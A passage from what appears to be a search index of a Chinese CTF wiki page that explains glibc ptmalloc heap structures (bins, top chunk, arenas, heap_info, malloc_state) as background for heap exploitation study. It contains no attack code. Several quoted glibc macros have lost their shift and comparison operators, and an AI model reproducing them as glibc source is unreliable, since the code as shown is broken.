\u5927\u5c0f\u4e4b\u95f4\u7684\u516c\u5dee\u4e00\u81f4\uff0c\u5177\u4f53\u5982\u4e0b\uff1a\n\n\n\n\n\n\n\n\n\u7ec4\n\n\n\u6570\u91cf\n\n\n\u516c\u5dee\n\n\n\n\n\n\n\n\n\n\n1\n\n\n32\n\n\n64B\n\n\n\n\n\n\n2\n\n\n16\n\n\n512B\n\n\n\n\n\n\n3\n\n\n8\n\n\n4096B\n\n\n\n\n\n\n4\n\n\n4\n\n\n32768B\n\n\n\n\n\n\n5\n\n\n2\n\n\n262144B\n\n\n\n\n\n\n6\n\n\n1\n\n\n\u4e0d\u9650\u5236\n\n\n\n\n\n\n\n\n\u8fd9\u91cc\u6211\u4eec\u4ee5 32 \u4f4d\u5e73\u53f0\u7684 large bin \u4e3a\u4f8b\uff0c\u7b2c\u4e00\u4e2a large bin \u7684\u8d77\u59cb chunk \u5927\u5c0f\u4e3a 512 \u5b57\u8282\uff0c\u4f4d\u4e8e\u7b2c\u4e00\u7ec4\uff0c\u6240\u4ee5\u8be5bin \u53ef\u4ee5\u5b58\u50a8\u7684 chunk \u7684\u5927\u5c0f\u8303\u56f4\u4e3a [512,512+64)\u3002\n\n\n\u5173\u4e8e large bin \u7684\u5b8f\u5982\u4e0b\uff0c\u8fd9\u91cc\u6211\u4eec\u4ee5 32 \u4f4d\u5e73\u53f0\u4e0b\uff0c\u7b2c\u4e00\u4e2a large bin \u7684\u8d77\u59cb chunk \u5927\u5c0f\u4e3a\u4f8b\uff0c\u4e3a 512 \u5b57\u8282\uff0c\u90a3\u4e48 512\n6 = 8\uff0c\u6240\u4ee5\u5176\u4e0b\u6807\u4e3a56+8=64\u3002\n\n\n#define largebin_index_32(sz)                                                  \\\n\n\n    (((((unsigned long) (sz)) \n 6) \n= 38)                                     \\\n\n\n         ? 56 + (((unsigned long) (sz)) \n 6)                                  \\\n\n\n         : ((((unsigned long) (sz)) \n 9) \n= 20)                               \\\n\n\n               ? 91 + (((unsigned long) (sz)) \n 9)                            \\\n\n\n               : ((((unsigned long) (sz)) \n 12) \n= 10)                        \\\n\n\n                     ? 110 + (((unsigned long) (sz)) \n 12)                    \\\n\n\n                     : ((((unsigned long) (sz)) \n 15) \n= 4)                   \\\n\n\n                           ? 119 + (((unsigned long) (sz)) \n 15)              \\\n\n\n                           : ((((unsigned long) (sz)) \n 18) \n= 2)             \\\n\n\n                                 ? 124 + (((unsigned long) (sz)) \n 18)        \\\n\n\n                                 : 126)\n\n\n\n#define largebin_index_32_big(sz)                                              \\\n\n\n    (((((unsigned long) (sz)) \n 6) \n= 45)                                     \\\n\n\n         ? 49 + (((unsigned long) (sz)) \n 6)                                  \\\n\n\n         : ((((unsigned long) (sz)) \n 9) \n= 20)                               \\\n\n\n               ? 91 + (((unsigned long) (sz)) \n 9)                            \\\n\n\n               : ((((unsigned long) (sz)) \n 12) \n= 10)                        \\\n\n\n                     ? 110 + (((unsigned long) (sz)) \n 12)                    \\\n\n\n                     : ((((unsigned long) (sz)) \n 15) \n= 4)                   \\\n\n\n                           ? 119 + (((unsigned long) (sz)) \n 15)              \\\n\n\n                           : ((((unsigned long) (sz)) \n 18) \n= 2)             \\\n\n\n                                 ? 124 + (((unsigned long) (sz)) \n 18)        \\\n\n\n                                 : 126)\n\n\n\n// XXX It remains to be seen whether it is good to keep the widths of\n\n\n// XXX the buckets the same or whether it should be scaled by a factor\n\n\n// XXX of two as well.\n\n\n#define largebin_index_64(sz)                                                  \\\n\n\n    (((((unsigned long) (sz)) \n 6) \n= 48)                                     \\\n\n\n         ? 48 + (((unsigned long) (sz)) \n 6)                                  \\\n\n\n         : ((((unsigned long) (sz)) \n 9) \n= 20)                               \\\n\n\n               ? 91 + (((unsigned long) (sz)) \n 9)                            \\\n\n\n               : ((((unsigned long) (sz)) \n 12) \n= 10)                        \\\n\n\n                     ? 110 + (((unsigned long) (sz)) \n 12)                    \\\n\n\n                     : ((((unsigned long) (sz)) \n 15) \n= 4)                   \\\n\n\n                           ? 119 + (((unsigned long) (sz)) \n 15)              \\\n\n\n                           : ((((unsigned long) (sz)) \n 18) \n= 2)             \\\n\n\n                                 ? 124 + (((unsigned long) (sz)) \n 18)        \\\n\n\n                                 : 126)\n\n\n\n#define largebin_index(sz)                                                     \\\n\n\n    (SIZE_SZ == 8 ? largebin_index_64(sz) : MALLOC_ALIGNMENT == 16             \\\n\n\n                                                ? largebin_index_32_big(sz)    \\\n\n\n                                                : largebin_index_32(sz))\n\n\n\n\n\nunsorted bin\n\n\nunsorted bin \u53ef\u4ee5\u89c6\u4e3a\u7a7a\u95f2 chunk \u56de\u5f52\u5176\u6240\u5c5e bin \u4e4b\u524d\u7684\u7f13\u51b2\u533a\u3002\n\n\n\u5176\u5728 glibc \u4e2d\u5177\u4f53\u7684\u8bf4\u660e\u5982\u4e0b\n\n\n/*\n\n\n   Unsorted chunks\n\n\n\n    All remainders from chunk splits, as well as all returned chunks,\n\n\n    are first placed in the \nunsorted\n bin. They are then placed\n\n\n    in regular bins after malloc gives them ONE chance to be used before\n\n\n    binning. So, basically, the unsorted_chunks list acts as a queue,\n\n\n    with chunks being placed on it in free (and malloc_consolidate),\n\n\n    and taken off (to be either used or placed in bins) in malloc.\n\n\n\n    The NON_MAIN_ARENA flag is never set for unsorted chunks, so it\n\n\n    does not have to be taken into account in size comparisons.\n\n\n */\n\n\n\n\n\n\u4ece\u4e0b\u9762\u7684\u5b8f\u6211\u4eec\u53ef\u4ee5\u770b\u51fa\n\n\n/* The otherwise unindexable 1-bin is used to hold unsorted chunks. */\n\n\n#define unsorted_chunks(M) (bin_at(M, 1))\n\n\n\n\n\nunsorted bin \u5904\u4e8e\u6211\u4eec\u4e4b\u524d\u6240\u8bf4\u7684bin\u6570\u7ec4\u4e0b\u68071\u5904\u3002\u6545\u800c unsorted bin\u53ea\u6709\u4e00\u4e2a\u94fe\u8868\u3002unsorted bin \u4e2d\u7684\u7a7a\u95f2 chunk \u5904\u4e8e\u4e71\u5e8f\u72b6\u6001\uff0c\u4e3b\u8981\u6709\u4e24\u4e2a\u6765\u6e90\n\n\n\n\n\u5f53\u4e00\u4e2a\u8f83\u5927\u7684 chunk \u88ab\u5206\u5272\u6210\u4e24\u534a\u540e\uff0c\u5982\u679c\u5269\u4e0b\u7684\u90e8\u5206\u5927\u4e8eMINSIZE\uff0c\u5c31\u4f1a\u88ab\u653e\u5230 unsorted bin \u4e2d\u3002\n\n\n\u91ca\u653e\u4e00\u4e2a\u4e0d\u5c5e\u4e8e fast bin \u7684 chunk\uff0c\u5e76\u4e14\u8be5 chunk \u4e0d\u548c top chunk \u7d27\u90bb\u65f6\uff0c\u8be5 chunk \u4f1a\u88ab\u9996\u5148\u653e\u5230 unsorted bin \u4e2d\u3002\u5173\u4e8e top chunk \u7684\u89e3\u91ca\uff0c\u8bf7\u53c2\u8003\u4e0b\u9762\u7684\u4ecb\u7ecd\u3002\n\n\n\n\n\u6b64\u5916\uff0cUnsorted Bin \u5728\u4f7f\u7528\u7684\u8fc7\u7a0b\u4e2d\uff0c\u91c7\u7528\u7684\u904d\u5386\u987a\u5e8f\u662f FIFO \u3002\n\n\ncommon macro\n\n\n\u8fd9\u91cc\u4ecb\u7ecd\u4e00\u4e9b\u901a\u7528\u7684\u5b8f\u3002\n\n\n\u6839\u636echunk\u7684\u5927\u5c0f\u7edf\u4e00\u5730\u83b7\u5f97chunk\u6240\u5728\u7684\u7d22\u5f15\n\n\n#define bin_index(sz)                                                          \\\n\n\n    ((in_smallbin_range(sz)) ? smallbin_index(sz) : largebin_index(sz))\n\n\n\n\n\ntop chunk\n\n\nglibc \u4e2d\u5bf9\u4e8e top chunk \u7684\u63cf\u8ff0\u5982\u4e0b\n\n\n/*\n\n\n   Top\n\n\n\n    The top-most available chunk (i.e., the one bordering the end of\n\n\n    available memory) is treated specially. It is never included in\n\n\n    any bin, is used only if no other chunk is available, and is\n\n\n    released back to the system if it is very large (see\n\n\n    M_TRIM_THRESHOLD).  Because top initially\n\n\n    points to its own bin with initial zero size, thus forcing\n\n\n    extension on the first malloc request, we avoid having any special\n\n\n    code in malloc to check whether it even exists yet. But we still\n\n\n    need to do so when getting memory from system, so we make\n\n\n    initial_top treat the bin as a legal but unusable chunk during the\n\n\n    interval between initialization and the first call to\n\n\n    sysmalloc. (This is somewhat delicate, since it relies on\n\n\n    the 2 preceding words to be zero during this interval as well.)\n\n\n */\n\n\n\n/* Conveniently, the unsorted bin can be used as dummy top on first call */\n\n\n#define initial_top(M) (unsorted_chunks(M))\n\n\n\n\n\n\u7a0b\u5e8f\u7b2c\u4e00\u6b21\u8fdb\u884c malloc \u7684\u65f6\u5019\uff0cheap \u4f1a\u88ab\u5206\u4e3a\u4e24\u5757\uff0c\u4e00\u5757\u7ed9\u7528\u6237\uff0c\u5269\u4e0b\u7684\u90a3\u5757\u5c31\u662f top chunk\u3002\u5176\u5b9e\uff0c\u6240\u8c13\u7684top chunk \u5c31\u662f\u5904\u4e8e\u5f53\u524d\u5806\u7684\u7269\u7406\u5730\u5740\u6700\u9ad8\u7684 chunk\u3002\u8fd9\u4e2a chunk \u4e0d\u5c5e\u4e8e\u4efb\u4f55\u4e00\u4e2a bin\uff0c\u5b83\u7684\u4f5c\u7528\u5728\u4e8e\u5f53\u6240\u6709\u7684bin \u90fd\u65e0\u6cd5\u6ee1\u8db3\u7528\u6237\u8bf7\u6c42\u7684\u5927\u5c0f\u65f6\uff0c\u5982\u679c\u5176\u5927\u5c0f\u4e0d\u5c0f\u4e8e\u6307\u5b9a\u7684\u5927\u5c0f\uff0c\u5c31\u8fdb\u884c\u5206\u914d\uff0c\u5e76\u5c06\u5269\u4e0b\u7684\u90e8\u5206\u4f5c\u4e3a\u65b0\u7684 top chunk\u3002\u5426\u5219\uff0c\u5c31\u5bf9heap\u8fdb\u884c\u6269\u5c55\u540e\u518d\u8fdb\u884c\u5206\u914d\u3002\u5728main arena\u4e2d\u901a\u8fc7sbrk\u6269\u5c55heap\uff0c\u800c\u5728thread arena\u4e2d\u901a\u8fc7mmap\u5206\u914d\u65b0\u7684heap\u3002\n\n\n\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0ctop chunk \u7684 prev_inuse \u6bd4\u7279\u4f4d\u59cb\u7ec8\u4e3a1\uff0c\u5426\u5219\u5176\u524d\u9762\u7684chunk\u5c31\u4f1a\u88ab\u5408\u5e76\u5230top chunk\u4e2d\u3002\n\n\n\u521d\u59cb\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06 unsorted chunk \u4f5c\u4e3a top chunk\u3002\n\n\nlast remainder\n\n\n\u5728\u7528\u6237\u4f7f\u7528 malloc \u8bf7\u6c42\u5206\u914d\u5185\u5b58\u65f6\uff0cptmalloc2 \u627e\u5230\u7684 chunk \u53ef\u80fd\u5e76\u4e0d\u662f\u548c\u7533\u8bf7\u7684\u5927\u5c0f\u4e00\u81f4\uff0c\u8fd9\u65f6\u5019\u5c31\u5c06\u5206\u5272\u4e4b\u540e\u7684\u5269\u4f59\u90e8\u5206\u79f0\u4e4b\u4e3a last remainder chunk \uff0cunsort bin\u4e5f\u4f1a\u5b58\u8fd9\u4e00\u5757\u3002top chunk \u5206\u5272\u5269\u4e0b\u7684\u90e8\u5206\u4e0d\u4f1a\u4f5c\u4e3alast remainer.\n\n\n\u5b8f\u89c2\u7ed3\u6784\n\n\narena\n\n\n\u5728\u6211\u4eec\u4e4b\u524d\u4ecb\u7ecd\u7684\u4f8b\u5b50\u4e2d\uff0c\u65e0\u8bba\u662f\u4e3b\u7ebf\u7a0b\u8fd8\u662f\u65b0\u521b\u5efa\u7684\u7ebf\u7a0b\uff0c\u5728\u7b2c\u4e00\u6b21\u7533\u8bf7\u5185\u5b58\u65f6\uff0c\u90fd\u4f1a\u6709\u72ec\u7acb\u7684arena\u3002\u90a3\u4e48\u4f1a\u4e0d\u4f1a\u6bcf\u4e2a\u7ebf\u7a0b\u90fd\u6709\u72ec\u7acb\u7684arena\u5462\uff1f\u4e0b\u9762\u6211\u4eec\u5c31\u5177\u4f53\u4ecb\u7ecd\u3002\n\n\narena \u6570\u91cf\n\n\n\u5bf9\u4e8e\u4e0d\u540c\u7cfb\u7edf\uff0carena\u6570\u91cf\u7684\n\u7ea6\u675f\n\u5982\u4e0b\n\n\nFor 32 bit systems:\n     Number of arena = 2 * number of cores.\nFor 64 bit systems:\n     Number of arena = 8 * number of cores.\n\n\n\n\n\u663e\u7136\uff0c\u4e0d\u662f\u6bcf\u4e00\u4e2a\u7ebf\u7a0b\u90fd\u4f1a\u6709\u5bf9\u5e94\u7684 arena\u3002\u81f3\u4e8e\u4e3a\u4ec0\u4e4864\u4f4d\u7cfb\u7edf\uff0c\u8981\u90a3\u4e48\u8bbe\u7f6e\uff0c\u6211\u4e5f\u6ca1\u6709\u60f3\u660e\u767d\u3002\u6b64\u5916\uff0c\u56e0\u4e3a\u6bcf\u4e2a\u7cfb\u7edf\u7684\u6838\u6570\u662f\u6709\u9650\u7684\uff0c\u5f53\u7ebf\u7a0b\u6570\u5927\u4e8e\u6838\u6570\u7684\u4e8c\u500d\uff08\u8d85\u7ebf\u7a0b\u6280\u672f\uff09\u65f6\uff0c\u5c31\u5fc5\u7136\u6709\u7ebf\u7a0b\u5904\u4e8e\u7b49\u5f85\u72b6\u6001\uff0c\u6240\u4ee5\u6ca1\u6709\u5fc5\u8981\u4e3a\u6bcf\u4e2a\u7ebf\u7a0b\u5206\u914d\u4e00\u4e2a arena\u3002\n\n\narena \u5206\u914d\u89c4\u5219\n\n\n\u5f85\u8865\u5145\u3002\n\n\n\u533a\u522b\n\n\n\u4e0e thread \u4e0d\u540c\u7684\u662f\uff0cmain_arena \u5e76\u4e0d\u5728\u7533\u8bf7\u7684 heap \u4e2d\uff0c\u800c\u662f\u4e00\u4e2a\u5168\u5c40\u53d8\u91cf\uff0c\u5728 libc.so \u7684\u6570\u636e\u6bb5\u3002\n\n\nheap_info\n\n\n\u7a0b\u5e8f\u521a\u5f00\u59cb\u6267\u884c\u65f6\uff0c\u6bcf\u4e2a\u7ebf\u7a0b\u662f\u6ca1\u6709 heap \u533a\u57df\u7684\u3002\u5f53\u5176\u7533\u8bf7\u5185\u5b58\u65f6\uff0c\u5c31\u9700\u8981\u4e00\u4e2a\u7ed3\u6784\u6765\u8bb0\u5f55\u5bf9\u5e94\u7684\u4fe1\u606f\uff0c\u800cheap_info \u7684\u4f5c\u7528\u5c31\u662f\u8fd9\u4e2a\u3002\u800c\u4e14\u5f53\u8be5heap\u7684\u8d44\u6e90\u88ab\u4f7f\u7528\u5b8c\u540e\uff0c\u5c31\u5fc5\u987b\u5f97\u518d\u6b21\u7533\u8bf7\u5185\u5b58\u4e86\u3002\u6b64\u5916\uff0c\u4e00\u822c\u7533\u8bf7\u7684heap \u662f\u4e0d\u8fde\u7eed\u7684\uff0c\u56e0\u6b64\u9700\u8981\u8bb0\u5f55\u4e0d\u540cheap\u4e4b\u95f4\u7684\u94fe\u63a5\u7ed3\u6784\u3002\n\n\n\u8be5\u6570\u636e\u7ed3\u6784\u662f\u4e13\u95e8\u4e3a\u4ece Memory Mapping Segment \u5904\u7533\u8bf7\u7684\u5185\u5b58\u51c6\u5907\u7684\uff0c\u5373\u4e3a\u975e\u4e3b\u7ebf\u7a0b\u51c6\u5907\u7684\u3002\n\n\n\u4e3b\u7ebf\u7a0b\u53ef\u4ee5\u901a\u8fc7 sbrk() \u51fd\u6570\u6269\u5c55 program break location \u83b7\u5f97\uff08\u76f4\u5230\u89e6\u53caMemory Mapping Segment\uff09\uff0c\u53ea\u6709\u4e00\u4e2aheap\uff0c\u6ca1\u6709 heap_info \u6570\u636e\u7ed3\u6784\u3002\n\n\nheap_info \u7684\u4e3b\u8981\u7ed3\u6784\u5982\u4e0b\n\n\n#define HEAP_MIN_SIZE (32 * 1024)\n\n\n#ifndef HEAP_MAX_SIZE\n\n\n# ifdef DEFAULT_MMAP_THRESHOLD_MAX\n\n\n#  define HEAP_MAX_SIZE (2 * DEFAULT_MMAP_THRESHOLD_MAX)\n\n\n# else\n\n\n#  define HEAP_MAX_SIZE (1024 * 1024) \n/* must be a power of two */\n\n\n# endif\n\n\n#endif\n\n\n\n/* HEAP_MIN_SIZE and HEAP_MAX_SIZE limit the size of mmap()ed heaps\n\n\n   that are dynamically created for multi-threaded programs.  The\n\n\n   maximum size must be a power of two, for fast determination of\n\n\n   which heap belongs to a chunk.  It should be much larger than the\n\n\n   mmap threshold, so that requests with a size just below that\n\n\n   threshold can be fulfilled without creating too many heaps.  */\n\n\n\n/***************************************************************************/\n\n\n\n/* A heap is a single contiguous memory region holding (coalesceable)\n\n\n   malloc_chunks.  It is allocated with mmap() and always starts at an\n\n\n   address aligned to HEAP_MAX_SIZE.  */\n\n\n\ntypedef\n \nstruct\n \n_heap_info\n\n\n{\n\n  \nmstate\n \nar_ptr\n;\n \n/* Arena for this heap. */\n\n  \nstruct\n \n_heap_info\n \n*\nprev\n;\n \n/* Previous heap. */\n\n  \nsize_t\n \nsize\n;\n   \n/* Current size in bytes. */\n\n  \nsize_t\n \nmprotect_size\n;\n \n/* Size in bytes that has been mprotected\n\n\n                           PROT_READ|PROT_WRITE.  */\n\n  \n/* Make sure the following data is properly aligned, particularly\n\n\n     that sizeof (heap_info) + 2 * SIZE_SZ is a multiple of\n\n\n     MALLOC_ALIGNMENT. */\n\n  \nchar\n \npad\n[\n-\n6\n \n*\n \nSIZE_SZ\n \n \nMALLOC_ALIGN_MASK\n];\n\n\n}\n \nheap_info\n;\n\n\n\n\n\n\u8be5\u7ed3\u6784\u4e3b\u8981\u662f\u63cf\u8ff0\u5806\u7684\u57fa\u672c\u4fe1\u606f\uff0c\u5305\u62ec\n\n\n\n\n\u5806\u5bf9\u5e94\u7684 arena \u7684\u5730\u5740\n\n\n\u7531\u4e8e\u4e00\u4e2a\u7ebf\u7a0b\u7533\u8bf7\u4e00\u4e2a\u5806\u4e4b\u540e\uff0c\u53ef\u80fd\u4f1a\u4f7f\u7528\u5b8c\uff0c\u4e4b\u540e\u5c31\u5fc5\u987b\u5f97\u518d\u6b21\u7533\u8bf7\u3002\u56e0\u6b64\uff0c\u4e00\u4e2a\u53ef\u80fd\u4f1a\u6709\u591a\u4e2a\u5806\u3002prev\u5373\u8bb0\u5f55\u4e86\u4e0a\u4e00\u4e2a heap_info \u7684\u5730\u5740\u3002\u8fd9\u91cc\u53ef\u4ee5\u770b\u5230\u6bcf\u4e2a\u5806\u7684 heap_info \u662f\u901a\u8fc7\u5355\u5411\u94fe\u8868\u8fdb\u884c\u94fe\u63a5\u7684\u3002\n\n\nsize \u8868\u793a\u5f53\u524d\u5806\u7684\u5927\u5c0f\n\n\n\u6700\u540e\u4e00\u90e8\u5206\u786e\u4fdd\u5bf9\u9f50\uff08\n\u8fd9\u91cc\u8d1f\u6570\u4f7f\u7528\u7684\u7f18\u7531\u662f\u4ec0\u4e48\u5462\n\uff1f\uff09\n\n\n\n\n\u770b\u8d77\u6765\u8be5\u7ed3\u6784\u5e94\u8be5\u662f\u76f8\u5f53\u91cd\u8981\u7684\uff0c\u4f46\u662f\u5982\u679c\u5982\u679c\u6211\u4eec\u4ed4\u7ec6\u770b\u5b8c\u6574\u4e2a malloc \u7684\u5b9e\u73b0\u7684\u8bdd\uff0c\u5c31\u4f1a\u53d1\u73b0\u5b83\u51fa\u73b0\u7684\u9891\u7387\u5e76\u4e0d\u9ad8\u3002\n\n\nmalloc_state\n\n\n\u8be5\u7ed3\u6784\u7528\u4e8e\u7ba1\u7406\u5806\uff0c\u8bb0\u5f55\u6bcf\u4e2a arena \u5f53\u524d\u7533\u8bf7\u7684\u5185\u5b58\u7684\u5177\u4f53\u72b6\u6001\uff0c\u6bd4\u5982\u8bf4\u662f\u5426\u6709\u7a7a\u95f2chunk\uff0c\u6709\u4ec0\u4e48\u5927\u5c0f\u7684\u7a7a\u95f2chunk \u7b49\u7b49\u3002\u65e0\u8bba\u662f thread arena \u8fd8\u662f main arena\uff0c\u5b83\u4eec\u90fd\u53ea\u6709\u4e00\u4e2a malloc state \u7ed3\u6784\u3002\u7531\u4e8e thread \u7684 arena \u53ef\u80fd\u6709\u591a\u4e2a\uff0cmalloc state\u7ed3\u6784\u4f1a\u5728\u6700\u65b0\u7533\u8bf7\u7684arena\u4e2d\u3002\n\n\n\u6ce8\u610f\uff0cmain arena \u7684 malloc_state \u5e76\u4e0d\u662f heap segment \u7684\u4e00\u90e8\u5206\uff0c\u800c\u662f\u4e00\u4e2a\u5168\u5c40\u53d8\u91cf\uff0c\u5b58\u50a8\u5728 libc.so \u7684\u6570\u636e\u6bb5\u3002\n\n\n\u5176\u7ed3\u6784\u5982\u4e0b\n\n\nstruct\n \nmalloc_state\n \n{\n\n    \n/* Serialize access.  */\n\n    \n__libc_lock_define\n(,\n \nmutex\n);\n\n\n    \n/* Flags (formerly in max_fast).  */\n\n    \nint\n \nflags\n;\n\n\n    \n/* Fastbins */\n\n    \nmfastbinptr\n \nfastbinsY\n[\n \nNFASTBINS\n \n];\n\n\n    \n/* Base of the topmost chunk -- not otherwise kept in a bin */\n\n    \nmchunkptr\n \ntop\n;\n\n\n    \n/* The remainder from the most recent split of a small request */\n\n    \nmchunkptr\n \nlast_remainder\n;\n\n\n    \n/* Normal bins packed as described above */\n\n    \nmchunkptr\n \nbins\n[\n \nNBINS\n \n*\n \n2\n \n-\n \n2\n \n];\n\n\n    \n/* Bitmap of bins, help to speed up the process of determinating if a given bin is definitely empty.*/\n\n    \nunsigned\n \nint\n \nbinmap\n[\n \nBINMAPSIZE\n \n];\n\n\n    \n/* Linked list, points to the next arena */\n\n    \nstruct\n \nmalloc_state\n \n*\nnext\n;\n\n\n    \n/* Linked list for free arenas.  Access to this field is serialized\n\n\n       by free_list_lock in arena.c.  */\n\n    \nstruct\n \nmalloc_state\n \n*\nnext_free\n;\n\n\n    \n/* Number of threads attached to this arena.  0 if the arena is on\n\n\n       the free list.  Access to this field is serialized by\n\n\n       free_list_lock in arena.c.  */\n\n    \nINTERNAL_SIZE_T\n \nattached_threads\n;\n\n\n    \n/* Memory allocated from the system in this arena.  */\n\n    \nINTERNAL_SIZE_T\n \nsystem_mem\n;\n\n    \nINTERNAL_SIZE_T\n \nmax_system_mem\n;\n\n\n};\n\n\n\n\n\n\n\n\n\n__libc_lock_define(, mutex);\n\n\n\n\n\u8be5\u53d8\u91cf\u7528\u4e8e\u63a7\u5236\u7a0b\u5e8f\u4e32\u884c\u8bbf\u95ee\u540c\u4e00\u4e2a\u5206\u914d\u533a\uff0c\u5f53\u4e00\u4e2a\u7ebf\u7a0b\u83b7\u53d6\u4e86\u5206\u914d\u533a\u4e4b\u540e\uff0c\u5176\u5b83\u7ebf\u7a0b\u8981\u60f3\u8bbf\u95ee\u8be5\u5206\u914d\u533a\uff0c\u5c31\u5fc5\u987b\u7b49\u5f85\u8be5\u7ebf\u7a0b\u5206\u914d\u5b8c\u6210\u5019\u624d\u80fd\u591f\u4f7f\u7528\u3002\n\n\n\n\n\n\n\n\nflags\n\n\n\n\nflags\u8bb0\u5f55\u4e86\u5206\u914d\u533a\u7684\u4e00\u4e9b\u6807\u5fd7\uff0c\u6bd4\u5982 bit0 \u8bb0\u5f55\u4e86\u5206\u914d\u533a\u662f\u5426\u6709 fast bin chunk \uff0cbit1 \u6807\u8bc6\u5206\u914d\u533a\u662f\u5426\u80fd\u8fd4\u56de\u8fde\u7eed\u7684\u865a\u62df\u5730\u5740\u7a7a\u95f4\u3002\u5177\u4f53\u5982\u4e0b\n\n\n\n\n\n\n\n\n/*\n\n\n   FASTCHUNKS_BIT held in max_fast indicates that there are probably\n\n\n   some fastbin chunks. It is set true on entering a chunk into any\n\n\n   fastbin, and cleared only in malloc_consolidate.\n\n\n   The truth value is inverted so that have_fastchunks will be true\n\n\n   upon startup (since statics are zero-filled), simplifying\n\n\n   initialization checks.\n\n\n */\n\n\n\n#define FASTCHUNKS_BIT (1U)\n\n\n\n#define have_fastchunks(M) (((M)-\nflags \n FASTCHUNKS_BIT) == 0)\n\n\n#define clear_fastchunks(M) catomic_or(\n(M)-\nflags, FASTCHUNKS_BIT)\n\n\n#define set_fastchunks(M) catomic_and(\n(M)-\nflags, ~FASTCHUNKS_BIT)\n\n\n\n/*\n\n\n   NONCONTIGUOUS_BIT indicates that MORECORE does not return contiguous\n\n\n   regions.  Otherwise, contiguity is exploited in merging together,\n\n\n   when possible, results from consecutive MORECORE calls.\n\n\n   The initial value comes from MORECORE_CONTIGUOUS, but is\n\n\n   changed dynamically if mmap is ever used as an sbrk substitute.\n\n\n */\n\n\n\n#define NONCONTIGUOUS_BIT (2U)\n\n\n\n#define contiguous(M) (((M)-\nflags \n NONCONTIGUOUS_BIT) == 0)\n\n\n#define noncontiguous(M) (((M)-\nflags \n NONCONTIGUOUS_BIT) != 0)\n\n\n#define set_noncontiguous(M) ((M)-\nflags |= NONCONTIGUOUS_BIT)\n\n\n#define set_contiguous(M) ((M)-\nflags \n= ~NONCONTIGUOUS_BIT)\n\n\n\n/* ARENA_CORRUPTION_BIT is set if a memory corruption was detected on the\n\n\n   arena.  Such an arena is no longer used to allocate chunks.  Chunks\n\n\n   allocated in that arena before detecting corruption are not freed.  */\n\n\n\n#define ARENA_CORRUPTION_BIT (4U)\n\n\n\n#define arena_is_corrupt(A) (((A)-\nflags \n ARENA_CORRUPTION_BIT))\n\n\n#define set_arena_corrupt(A) ((A)-\nflags |= ARENA_CORRUPTION_BIT)\n\n\n\n\n\n\n\nfastbinsY[NFASTBINS]\n\n\n\u5b58\u653e\u6bcf\u4e2a fast chunk \u94fe\u8868\u5934\u90e8\u7684\u6307\u9488\n\n\n\n\n\n\ntop\n\n\n\u6307\u5411\u5206\u914d\u533a\u7684 top chunk\n\n\n\n\n\n\nlast_reminder\n\n\n\u6700\u65b0\u7684 chunk \u5206\u5272\u4e4b\u540e\u5269\u4e0b\u7684\u90a3\u90e8\u5206\n\n\n\n\n\n\nbins\n\n\n\u7528\u4e8e\u5b58\u50a8 unstored bin\uff0csmall bins \u548c large bins \u7684 chunk \u94fe\u8868\u3002\n\n\n\n\n\n\nbinmap\n\n\nptmalloc \u7528\u4e00\u4e2a bit \u6765\u6807\u8bc6\u67d0\u4e00\u4e2a bin \u4e2d\u662f\u5426\u5305\u542b\u7a7a\u95f2 chunk \u3002\n\n\n\n\n\n\n\n\nmalloc_par\n\n\n\uff01\uff01\u5f85\u8865\u5145\uff01\uff01", 
            "title": "\u5806\u76f8\u5173\u6570\u636e\u7ed3\u6784"
        }, 
        {
            "location": "/pwn/heap/heap_structure/#_1", 
            "text": "\u5806\u7684\u64cd\u4f5c\u5c31\u8fd9\u4e48\u590d\u6742\uff0c\u90a3\u4e48\u5728 glibc \u5185\u90e8\u5fc5\u7136\u4e5f\u6709\u7cbe\u5fc3\u8bbe\u8ba1\u7684\u6570\u636e\u7ed3\u6784\u6765\u7ba1\u7406\u5b83\u3002\u4e0e\u5806\u76f8\u5e94\u7684\u6570\u636e\u7ed3\u6784\u4e3b\u8981\u5206\u4e3a   \u5b8f\u89c2\u7ed3\u6784\uff0c\u5305\u542b\u5806\u7684\u5b8f\u89c2\u4fe1\u606f\uff0c\u53ef\u4ee5\u901a\u8fc7\u8fd9\u4e9b\u6570\u636e\u7ed3\u6784\u7d22\u5f15\u5806\u7684\u57fa\u672c\u4fe1\u606f\u3002  \u5fae\u89c2\u7ed3\u6784\uff0c\u7528\u4e8e\u5177\u4f53\u5904\u7406\u5806\u7684\u5206\u914d\u4e0e\u56de\u6536\u4e2d\u7684\u5185\u5b58\u5757\u3002", 
            "title": "\u5806\u76f8\u5173\u6570\u636e\u7ed3\u6784"
        }, 
        {
            "location": "/pwn/heap/heap_structure/#overview", 
            "text": "\u8fd9\u91cc\u7ed9\u4e00\u4e2a\u5b8f\u89c2\u7684\u56fe\u7247\u3002", 
            "title": "Overview\uff1f\uff1f\uff1f\uff1f"
        }, 
        {
            "location": "/pwn/heap/heap_structure/#_2", 
            "text": "\u8fd9\u91cc\u9996\u5148\u4ecb\u7ecd\u5806\u4e2d\u6bd4\u8f83\u7ec6\u8282\u7684\u7ed3\u6784\uff0c \u5806\u7684\u6f0f\u6d1e\u5229\u7528\u4e0e\u8fd9\u4e9b\u7ed3\u6784\u5bc6\u5207\u76f8\u5173 \u3002", 
            "title": "\u5fae\u89c2\u7ed3\u6784"
        }, 
        {
            "location": "/pwn/heap/heap_structure/#malloc_chunk", 
            "text": "", 
            "title": "malloc_chunk"
        }, 
        {
            "location": "/pwn/heap/heap_structure/#_3", 
